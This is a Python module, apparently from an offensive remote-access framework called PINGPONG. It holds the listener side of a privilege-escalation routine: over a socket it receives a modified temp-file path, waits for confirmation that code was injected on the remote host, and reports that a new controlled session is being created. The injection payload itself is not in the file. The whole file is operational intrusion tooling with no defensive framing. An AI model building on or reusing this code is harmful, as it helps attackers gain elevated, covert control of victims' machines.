# -*- coding:utf-8 -*-
# @FileName  :priv_vbp_listen.py
# @Time      :2023/01/12 16:38:43
# @Author    :D0WE1L1N
import sys
from pathlib import Path
sys.path.append("..")
from main import print_good, print_normal
import PINGPONG_script.addsend as addsend
global is_open
is_open = True
def priv_vbp_listen(sendobj, conn, addr, my_addr):
    if sendobj.App_send("PRO_VBP_APP", False, conn, addr, my_addr):
        try:
            print_normal("PINGPONG>[*]Starting......")
            dir_data_s = conn.recv(1024)
            dir_data = dir_data_s.decode("utf8")
            conn.send(b'OK')
            print_good(f"PINGPONG>[+]TEMP FILE MODIFIED AT {dir_data}")
            print_normal("PINGPONG>[*]Injecting Code......")
            done_data = conn.recv(1024)
            if done_data:
                conn.send(b'OK')
                print_good("PINGPONG>[+]INJECT SUCCESSFULLY, CREATING PINGPONG SESSION......")
                return True
        except KeyboardInterrupt:
            conn.send(b'EXIT')
            return False
    else:
        return False
def run(conn, addr, my_addr):
    priv_vbp_listen(addsend, conn, addr, my_addr)    
